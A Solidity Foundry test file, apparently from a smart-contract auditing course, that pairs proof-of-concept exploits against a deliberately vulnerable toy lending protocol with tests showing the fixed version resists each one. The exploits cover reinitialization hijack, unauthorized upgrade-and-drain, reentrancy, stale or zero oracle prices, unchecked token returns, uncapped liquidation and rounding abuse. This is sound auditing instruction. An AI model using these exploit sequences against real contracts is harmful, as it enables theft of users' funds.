// SPDX-License-Identifier: MIT
// 配套章节：audit/R25 实战项目 ｜ 每个发现一组测试：漏洞版证明损失，修复版用同一场景证明失败
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MiniLend} from "../src/MiniLend.sol";
import {MiniLendFixed} from "../src/MiniLendFixed.sol";
import {MiniLendProxy} from "../src/MiniLendProxy.sol";
import {IMiniLend, ToyUSD, ToyPriceFeed, ReentrantWithdrawer, EvilImplementation} from "./MiniLendHelpers.sol";

contract MiniLendPoCTest is Test {
    int256 constant ETH_2000 = 2_000e8; // 示例价格
    uint256 constant USD_LIQUIDITY = 1_000_000e18;

    ToyUSD usd;
    ToyPriceFeed feed;
    IMiniLend vuln;
    IMiniLend fixedLend;
    address owner = makeAddr("owner");
    address victim = makeAddr("victim");
    address payable attacker = payable(makeAddr("attacker"));
    address liquidator = makeAddr("liquidator");

    function setUp() public {
        vm.warp(1_000_000);
        usd = new ToyUSD();
        feed = new ToyPriceFeed(ETH_2000);
        vuln = _deploy(address(new MiniLend()));
        fixedLend = _deploy(address(new MiniLendFixed()));
        vm.deal(victim, 1_000 ether);
        vm.deal(attacker, 1_000 ether);
    }

    function _deploy(address impl) internal returns (IMiniLend lend) {
        bytes memory init = abi.encodeCall(IMiniLend.initialize, (address(usd), address(feed), owner));
        lend = IMiniLend(address(new MiniLendProxy(impl, init)));
        usd.mint(address(lend), USD_LIQUIDITY);
    }

    function _victimDeposit(IMiniLend lend, uint256 amt) internal {
        vm.prank(victim);
        lend.deposit{value: amt}();
    }

    // ---------- F-01 initialize 可重复调用 ----------

    function test_F01_PoC_ReinitializeHijacksProtocol() public {
        ToyPriceFeed evilFeed = new ToyPriceFeed(type(int128).max);
        vm.startPrank(attacker);
        vuln.initialize(address(usd), address(evilFeed), attacker);
        vuln.deposit{value: 1}();
        vuln.borrow(USD_LIQUIDITY);
        vm.stopPrank();
        assertEq(vuln.owner(), attacker);
        assertEq(usd.balanceOf(attacker), USD_LIQUIDITY, "all USD stolen for 1 wei");
    }

    function test_F01_Fixed_ReinitializeReverts() public {
        ToyPriceFeed evilFeed = new ToyPriceFeed(type(int128).max);
        vm.prank(attacker);
        vm.expectRevert("initialized");
        fixedLend.initialize(address(usd), address(evilFeed), attacker);
        assertEq(fixedLend.owner(), owner);
    }

    function test_F01_Fixed_ImplementationLocked() public {
        MiniLendFixed impl = new MiniLendFixed();
        vm.prank(attacker);
        vm.expectRevert("initialized");
        impl.initialize(address(usd), address(feed), attacker);
    }

    // ---------- F-02 upgradeTo 没有权限检查 ----------

    function test_F02_PoC_AnyoneUpgradesAndDrains() public {
        _victimDeposit(vuln, 100 ether);
        EvilImplementation evil = new EvilImplementation();
        uint256 start = attacker.balance;
        vm.startPrank(attacker);
        vuln.upgradeTo(address(evil));
        EvilImplementation(address(vuln)).drain(attacker);
        vm.stopPrank();
        assertEq(attacker.balance, start + 100 ether, "all collateral stolen");
    }

    function test_F02_Fixed_UpgradeRequiresOwner() public {
        _victimDeposit(fixedLend, 100 ether);
        EvilImplementation evil = new EvilImplementation();
        vm.prank(attacker);
        vm.expectRevert("not owner");
        fixedLend.upgradeTo(address(evil));
        assertEq(address(fixedLend).balance, 100 ether);
    }

    // ---------- F-03 withdraw 重入 ----------

    function test_F03_PoC_ReentrantWithdrawDrainsOtherUsers() public {
        _victimDeposit(vuln, 10 ether);
        ReentrantWithdrawer bot = new ReentrantWithdrawer(vuln);
        vm.prank(attacker);
        bot.run{value: 1 ether}();
        assertEq(address(vuln).balance, 0, "victim collateral gone");
        assertEq(address(bot).balance, 11 ether, "attacker took 10 ether extra");
        assertEq(vuln.collateral(victim), 10 ether, "ledger still claims 10 ether");
    }

    function test_F03_Fixed_ReentrantWithdrawReverts() public {
        _victimDeposit(fixedLend, 10 ether);
        ReentrantWithdrawer bot = new ReentrantWithdrawer(fixedLend);
        vm.prank(attacker);
        vm.expectRevert(_err("send"));
        bot.run{value: 1 ether}();
        assertEq(address(fixedLend).balance, 10 ether);
    }

    // ---------- F-04 withdraw 不检查健康度 ----------

    function test_F04_PoC_WithdrawAllCollateralKeepDebt() public {
        vm.startPrank(attacker);
        vuln.deposit{value: 10 ether}();
        vuln.borrow(15_000e18);
        vuln.withdraw(10 ether);
        vm.stopPrank();
        assertEq(usd.balanceOf(attacker), 15_000e18, "attacker keeps USD");
        assertEq(vuln.collateral(attacker), 0, "and gets all ETH back");
        assertEq(vuln.debtOf(attacker), 15_000e18, "debt is unbacked");
    }

    function test_F04_Fixed_WithdrawBelowLtvReverts() public {
        vm.startPrank(attacker);
        fixedLend.deposit{value: 10 ether}();
        fixedLend.borrow(15_000e18);
        vm.expectRevert(_err("LTV"));
        fixedLend.withdraw(10 ether);
        vm.stopPrank();
        assertEq(fixedLend.collateral(attacker), 10 ether);
    }

    // ---------- F-05 价格没有校验 ----------

    function test_F05_PoC_StalePriceAllowsOverBorrow() public {
        // 喂价停在 2,000。真实市场价已经跌到 1,000（示例）。
        vm.warp(block.timestamp + 3 days);
        vm.startPrank(attacker);
        vuln.deposit{value: 10 ether}();
        vuln.borrow(15_000e18);
        vm.stopPrank();
        uint256 trueValue = 10 ether * 1_000 / 1;
        assertGt(vuln.debtOf(attacker), trueValue, "debt exceeds true collateral value");
    }

    function test_F05_Fixed_StalePriceReverts() public {
        vm.prank(attacker);
        fixedLend.deposit{value: 10 ether}();
        vm.warp(block.timestamp + 3 days);
        vm.prank(attacker);
        vm.expectRevert("stale price");
        fixedLend.borrow(15_000e18);
    }

    function test_F05_PoC_ZeroPriceLiquidatesHealthyUser() public {
        _openPosition(vuln, 10 ether, 1_000e18);
        feed.set(0, block.timestamp);
        _approveLiquidator(vuln, 1_000e18);
        uint256 start = liquidator.balance;
        vm.prank(liquidator);
        vuln.liquidate(victim);
        assertEq(liquidator.balance, start + 10 ether, "liquidated at zero price");
    }

    function test_F05_Fixed_ZeroPriceReverts() public {
        _openPosition(fixedLend, 10 ether, 1_000e18);
        feed.set(0, block.timestamp);
        _approveLiquidator(fixedLend, 1_000e18);
        vm.prank(liquidator);
        vm.expectRevert("bad price");
        fixedLend.liquidate(victim);
        assertEq(fixedLend.collateral(victim), 10 ether);
    }

    // ---------- F-06 未检查代币返回值 ----------

    function test_F06_PoC_RepayWithoutPaying() public {
        vm.startPrank(attacker);
        vuln.deposit{value: 10 ether}();
        vuln.borrow(10_000e18);
        usd.transfer(makeAddr("stash"), 10_000e18); // 转走 USD，余额为 0，也没有授权
        vuln.repay(10_000e18); // transferFrom 返回 false，合约仍然清账
        vuln.withdraw(10 ether);
        vm.stopPrank();
        assertEq(vuln.debtOf(attacker), 0, "debt erased without payment");
        assertEq(usd.balanceOf(address(vuln)), USD_LIQUIDITY - 10_000e18, "USD never came back");
    }

    function test_F06_Fixed_RepayWithoutPayingReverts() public {
        vm.startPrank(attacker);
        fixedLend.deposit{value: 10 ether}();
        fixedLend.borrow(10_000e18);
        usd.transfer(makeAddr("stash"), 10_000e18);
        vm.expectRevert("usd transfer failed");
        fixedLend.repay(10_000e18);
        vm.stopPrank();
        assertEq(fixedLend.debtOf(attacker), 10_000e18);
    }

    // ---------- F-07 清算没有比例和奖励上限 ----------

    function test_F07_PoC_LiquidatorSeizesAllCollateral() public {
        _openPosition(vuln, 10 ether, 15_000e18);
        feed.set(1_800e8, block.timestamp); // 刚越过 80% 清算线（示例）
        _approveLiquidator(vuln, 15_000e18);
        uint256 start = liquidator.balance;
        vm.prank(liquidator);
        vuln.liquidate(victim);
        assertEq(liquidator.balance - start, 10 ether, "all collateral seized");
        // 清算人支付 15,000 USD，得到价值 18,000 USD 的 ETH，溢价 20%
        assertEq(vuln.collateral(victim), 0);
    }

    function test_F07_Fixed_PartialLiquidationCapsBonus() public {
        _openPosition(fixedLend, 10 ether, 15_000e18);
        feed.set(1_800e8, block.timestamp);
        _approveLiquidator(fixedLend, 15_000e18);
        uint256 usdStart = usd.balanceOf(liquidator);
        uint256 ethStart = liquidator.balance;
        vm.prank(liquidator);
        fixedLend.liquidate(victim);
        uint256 paid = usdStart - usd.balanceOf(liquidator);
        uint256 seized = liquidator.balance - ethStart;
        assertEq(paid, 7_500e18, "at most 50% of debt");
        assertEq(seized * 1_800, paid * 105 / 100, "bonus capped at 5%");
        assertGt(fixedLend.collateral(victim), 5 ether, "borrower keeps the rest");
        assertGt(fixedLend.debtOf(victim), 0);
    }

    function test_F07_Fixed_SeizureCappedAtCollateralBadDebtRemains() public {
        _openPosition(fixedLend, 10 ether, 15_000e18);
        feed.set(500e8, block.timestamp); // 抵押品价值 5,000 USD，低于债务（示例）
        _approveLiquidator(fixedLend, 15_000e18);
        uint256 start = liquidator.balance;
        vm.prank(liquidator);
        fixedLend.liquidate(victim);
        assertEq(liquidator.balance - start, 10 ether, "seizure capped at collateral");
        assertEq(fixedLend.collateral(victim), 0);
        assertGt(fixedLend.debtOf(victim), 10_000e18, "bad debt stays on the ledger");
    }

    function test_F07_Fixed_ContractLiquidatorSupported() public {
        _openPosition(fixedLend, 10 ether, 15_000e18);
        feed.set(1_800e8, block.timestamp);
        GasHungryLiquidator bot = new GasHungryLiquidator(fixedLend, usd);
        usd.mint(address(bot), 15_000e18);
        bot.go(victim);
        assertGt(address(bot).balance, 0, "contract wallet can receive ETH");
    }

    function test_F07_PoC_ContractLiquidatorFailsOnTransfer() public {
        _openPosition(vuln, 10 ether, 15_000e18);
        feed.set(1_800e8, block.timestamp);
        GasHungryLiquidator bot = new GasHungryLiquidator(vuln, usd);
        usd.mint(address(bot), 15_000e18);
        vm.expectRevert(); // transfer 只转发 2300 gas
        bot.go(victim);
    }

    // ---------- F-08 取整方向 ----------

    function test_F08_PoC_DustBorrowCreatesNoDebt() public {
        vm.prank(attacker);
        vuln.deposit{value: 1 ether}();
        vm.warp(block.timestamp + 365 days); // 利息指数上升
        vm.startPrank(attacker);
        for (uint256 i; i < 100; i++) vuln.borrow(1);
        vm.stopPrank();
        assertEq(usd.balanceOf(attacker), 100, "100 wei borrowed");
        assertEq(vuln.debtShares(attacker), 0, "no debt recorded");
    }

    function test_F08_PoC_RepayRoundsInBorrowerFavour() public {
        vm.startPrank(attacker);
        vuln.deposit{value: 1 ether}();
        vuln.borrow(100);
        usd.approve(address(vuln), type(uint256).max);
        vm.stopPrank();
        vm.warp(block.timestamp + 365 days);
        vm.prank(attacker);
        vuln.repay(1); // 还 1 wei，却烧掉价值大于 1 wei 的 1 份额
        assertEq(vuln.debtShares(attacker), 99, "one full share burned for 1 wei");
        assertGt(vuln.borrowIndex(), 1e27, "share is worth more than 1 wei");
    }

    function test_F08_Fixed_DustBorrowCreatesDebt() public {
        vm.prank(attacker);
        fixedLend.deposit{value: 1 ether}();
        _refreshAfter(365 days);
        vm.startPrank(attacker);
        for (uint256 i; i < 100; i++) fixedLend.borrow(1);
        vm.stopPrank();
        assertEq(fixedLend.debtShares(attacker), 100, "every borrow records debt");
        assertGe(fixedLend.debtOf(attacker), 100);
    }

    function test_F08_Fixed_DustRepayBurnsNothing() public {
        vm.startPrank(attacker);
        fixedLend.deposit{value: 1 ether}();
        fixedLend.borrow(100);
        usd.approve(address(fixedLend), type(uint256).max);
        vm.stopPrank();
        _refreshAfter(365 days);
        vm.prank(attacker);
        vm.expectRevert("zero repay");
        fixedLend.repay(1);
    }

    function testFuzz_Fixed_BorrowAlwaysCreatesAtLeastTheBorrowedDebt(uint256 amt, uint32 elapsed) public {
        amt = bound(amt, 1, 1_000e18);
        vm.prank(attacker);
        fixedLend.deposit{value: 10 ether}();
        _refreshAfter(elapsed);
        vm.prank(attacker);
        fixedLend.borrow(amt);
        assertGe(fixedLend.debtOf(attacker), amt);
    }

    // ---------- 工具函数 ----------

    /// @dev 不超过 4 字节的字符串字面量会让 expectRevert 重载产生歧义
    function _err(string memory reason) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("Error(string)", reason);
    }

    function _refreshAfter(uint256 elapsed) internal {
        vm.warp(block.timestamp + elapsed);
        feed.set(ETH_2000, block.timestamp);
    }

    function _openPosition(IMiniLend lend, uint256 eth, uint256 usdAmt) internal {
        vm.startPrank(victim);
        lend.deposit{value: eth}();
        lend.borrow(usdAmt);
        vm.stopPrank();
    }

    function _approveLiquidator(IMiniLend lend, uint256 amt) internal {
        usd.mint(liquidator, amt);
        vm.prank(liquidator);
        usd.approve(address(lend), type(uint256).max);
    }
}

/// @notice 合约钱包清算人：receive 消耗的 gas 超过 2300
contract GasHungryLiquidator {
    IMiniLend public immutable lend;
    ToyUSD public immutable usd;
    uint256 public received;

    constructor(IMiniLend _lend, ToyUSD _usd) {
        lend = _lend;
        usd = _usd;
    }

    function go(address user) external {
        usd.approve(address(lend), type(uint256).max);
        lend.liquidate(user);
    }

    receive() external payable {
        received += msg.value; // 写存储，超过 2300 gas
    }
}
